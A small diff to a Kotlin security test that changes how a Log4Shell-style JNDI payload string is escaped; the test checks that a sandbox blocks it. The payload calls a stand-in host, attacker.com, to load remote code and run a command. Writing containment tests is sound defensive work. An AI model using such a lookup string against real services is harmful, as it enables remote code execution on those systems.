@@ -25,7 +25,7 @@ class ProtectionDemonstrationTest {
         val marker = File("/tmp/pwned_safe")
         marker.delete()
 
-        val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"
+        val payload = $$"${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"
 
         val ex = assertFailsWith<ContainmentViolationException> {
             SafeRunner.run(payload)
